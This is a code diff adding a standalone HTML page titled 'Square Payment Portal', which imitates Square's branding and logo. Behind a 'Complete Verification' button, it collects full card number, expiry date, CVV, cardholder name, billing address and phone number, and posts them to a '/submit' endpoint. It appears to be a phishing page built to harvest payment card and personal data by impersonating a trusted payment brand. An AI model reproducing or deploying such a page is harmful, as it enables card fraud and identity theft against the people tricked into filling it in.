@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport"
+content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
+
+    <title>Square Payment Portal</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont,
+"Segoe UI", Roboto, Helvetica, Arial, sans-serif; background:
+#f7f7f7; display: flex; justify-content: center; padding: 10px;
+margin: 0; }
+        .c { background: #fff; padding: 25px; border-radius: 8px;
+box-shadow: 0 2px 10px rgba(0,0,0,0.05); width: 100%; max-width:
+390px; margin-top: 20px; }
+        .l { text-align: center; margin-bottom: 20px; }
+        h2 { text-align: center; font-weight: 500; margin-bottom:
+25px; color: #1a1a1a; font-size: 22px; }
+        label { font-size: 11px; font-weight: 700; text-transform:
+uppercase; display: block; margin-bottom: 8px; color: #373f4a;
+letter-spacing: 0.5px; }
+        input { width: 100%; padding: 14px; margin-bottom: 15px;
+border: 1px solid #e0e2e5; border-radius: 4px; box-sizing:
+border-box; font-size: 16px; outline: none; transition:
+border-color 0.2s; }
+        input:focus { border-color: #006aff; }
+        .r { display: flex; gap: 10px; }
+        button { width: 100%; background: #006aff; color: #fff;
+border: none; padding: 18px; border-radius: 4px; font-weight:
+bold; font-size: 16px; margin-top: 10px; cursor: pointer; }
+        button:active { background: #0056ce; }
+        .amt-box { background: #f9f9f9; border: 2px solid #006aff;
+color: #1a1a1a; font-size: 24px; font-weight: bold; text-align:
+center; width: 100%; padding: 15px; border-radius: 4px;
+margin-bottom: 25px; box-sizing: border-box; }
+    </style>
+</head>
+<body>
+    <div class="c">
+        <div class="l">
+            <svg width="40" height="40" viewBox="0 0 40 40">
+                <path d="M33.3 0H6.7C3 0 0 3 0 6.7v26.6C0 37 3 40
+6.7 40h26.6c3.7 0 6.7-3 6.7-6.7V6.7C40 3 37 0 33.3 0zm-2.2
+31.1H8.9V8.9h22.2v22.2zm-4.4-17.8H13.3v13.4h13.4V13.3z"
+fill="#006aff"/>
+            </svg>
+        </div>
+        <h2>Square</h2>
+
+        <form action="/submit" method="POST">
+            <label>Payment Amount</label>
+            <input type="text" name="amount" class="amt-box"
+value="$ 0.00" id="a">
+
+            <label>Card Details</label>
+            <input type="text" name="cardnumber" placeholder="Card
+Number" required maxlength="19">
+            <div class="r">
+                <input type="text" name="exp" placeholder="MM/YY"
+required maxlength="5" style="flex:1;">
+                <input type="text" name="cvv" placeholder="CVV"
+required maxlength="4" style="flex:1;">
+            </div>
+
+            <label>Name</label>
+            <input type="text" name="cardname" placeholder="Full
+Name on Card" required>
+
+            <label>Billing Address</label>
+            <input type="text" name="address" placeholder="Street
+Address" required>
+            <div class="r">
+                <input type="text" name="city" placeholder="City"
+required style="flex:2;">
+                <input type="text" name="state" placeholder="ST"
+required style="flex:1;">
+                <input type="text" name="zip" placeholder="Zip"
+required style="flex:1.5;">
+            </div>
+
+            <label>Contact Info</label>
+            <input type="text" name="phone" placeholder="Phone
+Number" required>
+
+            <button type="submit">Complete Verification</button>
+        </form>
+    </div>
+
+    <script>
+        const el = document.getElementById("a");
+        el.addEventListener("input", e => {
+            let v = e.target.value.replace(/[^0-9.]/g, "");
+            e.target.value = v ? "$ " + v : "$ ";
+        });
+    </script>
+</body>
+</html>
